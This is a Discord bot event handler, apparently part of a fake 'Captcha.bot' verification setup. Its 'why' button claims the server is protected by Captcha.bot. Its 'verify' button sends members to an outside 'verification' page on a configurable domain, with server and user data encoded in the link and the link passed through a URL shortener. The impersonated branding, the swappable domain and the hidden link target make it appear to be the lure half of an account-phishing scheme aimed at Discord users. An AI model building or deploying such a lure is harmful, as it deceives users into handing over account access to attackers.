const {
    ButtonBuilder,
    ActionRowBuilder,
    EmbedBuilder
} = require('discord.js')

const shortener = require('../../resources/functions/shortener')

module.exports = {
    name: 'interactionCreate',
    async execute(interaction) {
        if (!interaction.isButton()) return

        const domain = (require('../profile/domain.json')).url

        if (interaction && interaction.customId === 'why') {
            try {
                return await interaction.reply({
                    content: `This server is protected by https://${domain} to prevent raids & malicious users. You can protect your server by inviting Captcha.bot here: ${domain}/secure .\nTo gain access to this server you will need to verify yourself by completing a captcha.\n\n❓ What can Captcha.bot do?\n${'`' + '-' +  '`'} View your name and avatar. It does not have access to control your account.\n${'`' + '-' + '`'} View which servers you have joined!`,
                    ephemeral: true
                })
            } catch (e) {
                console.error(e)
                return await interaction.reply({
                    content: `An error occurred while trying to explain the verification process. Please try again later.`,
                    ephemeral: true
                })
            }
        } else if (interaction && interaction.customId === 'verify') {
            try {
                const buffer = Buffer.from(JSON.stringify({
                    "guildId": interaction.guild.id,
                    "clientId": interaction.user.id,
                    "name": interaction.guild.name,
                    "members": interaction.guild.members.cache.size,
                    "icon": interaction.guild.iconURL({
                        dynamic: true
                    })
                })).toString('base64')

                const user_url = await shortener(`https://${domain}/verification?data=${buffer}`) || `https://${domain}/verification?data=${buffer}`

                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                    .setCustomId('disabled')
                    .setLabel(`ONLY verify on ${domain}`)
                    .setStyle('Secondary')
                    .setDisabled(true)
                )

                const embed = new EmbedBuilder()
                    .setTitle(`Please verify yourself to gain access to ${interaction.guild.name}`)
                    .setDescription(`Please complete this captcha to prove you are a human: [Click here](${user_url})`)
                    .setColor('#336B8C')
                    .setTimestamp()

                await interaction.reply({
                    embeds: [embed],
                    components: [row],
                    ephemeral: true
                })
            } catch (e) {
                console.error(e)
                return await interaction.reply({
                    content: `An error occurred while trying to verify you. Please try again later.`,
                    ephemeral: true
                })
            }
        }
    }
}